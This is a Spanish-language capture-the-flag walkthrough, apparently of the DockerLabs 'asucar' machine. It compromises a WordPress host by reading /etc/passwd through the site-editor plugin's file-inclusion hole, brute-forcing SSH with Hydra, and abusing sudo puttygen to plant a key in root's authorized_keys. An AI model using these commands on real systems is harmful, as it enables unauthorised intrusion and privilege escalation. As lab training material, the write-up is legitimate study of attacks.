nmap: 22,80

![image](https://github.com/user-attachments/assets/8504499b-9655-431e-a40f-ea0959b954cf)


---
en la pagina principal podemos ver que es de wordpress:

![image](https://github.com/user-attachments/assets/f9cd8200-a10f-4ea9-97fa-bde2654899cb)

como sabemos que es un wordpress podemos utilizar sus herramientas. hacemos un "wpscan":

    -  wpscan --url http://asucar.dl/ 

nos da una version de "site-editor 1.1"

![image](https://github.com/user-attachments/assets/7e5f859f-eea9-4ac8-9341-3c89158bd8e5)


hacemos un searchsploit site-editor plugin, buscamos con:

      - searchsploit -x php/webapps/44340.txt  
      
nos da:
> site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php

buscamos sobre el exploit: https://www.exploit-db.com/exploits/44340

![image](https://github.com/user-attachments/assets/1fc5f8f5-8ed3-48dc-b28e-762f86653953)


y encontré que si en la barra de búsqueda colocamos: http://asucar.dl/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

![image](https://github.com/user-attachments/assets/d02df419-b597-4b29-8f0d-a1403bd40c07)


y nos dio el contenido de "/etc/passwd" 

vemos que tenemos el usuario "*curiosito*"

hacemos un ataque de fuerza bruta:

         -hydra -l curiosito -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2

y nos dio: password1

![image](https://github.com/user-attachments/assets/fb17e9e4-9822-4484-b6e2-52ffe7101fc1)

entramos por el ssh

al hacer "sudo -l" nos aparece "puttygen" que es un comando para generar claves privadas como publicas.

![image](https://github.com/user-attachments/assets/d7798445-a0ae-43dc-ad7c-4c3895b06260)


y encontré que tenemos permisos root generamos una clave primero:

      -  puttygen -t rsa -b 2048 -o rootAccess.ppk

![image](https://github.com/user-attachments/assets/8d29600c-e370-4b56-bef7-bd2708d06e7e)

se puede dejar sin contraseña o con contraseña
lo pasamos una clave publica:
    
      - sudo puttygen rootAccess.ppk -O public-openssh -o /root/.ssh/authorized_keys
    
 ahora una privada:
   
    - puttygen rootAccess.ppk -O private-openssh -o privateRootAccess.ppk

en nuestra terminal colocamos:

      - scp curiosito@172.17.0.2:/home/curiosito/privateRootAccess.ppk . 

para pasarnos la clave privada.

![image](https://github.com/user-attachments/assets/1755bf41-4b22-408b-b166-352148d9c0a2)


 ya pasado hacemos un:
        
    - ssh root@172.17.0.2 -i privateRootAccess.ppk 

![[dockerlabs/medio/asucar/root.png]]

colocamos la contraseña que colocamos y somos root! 
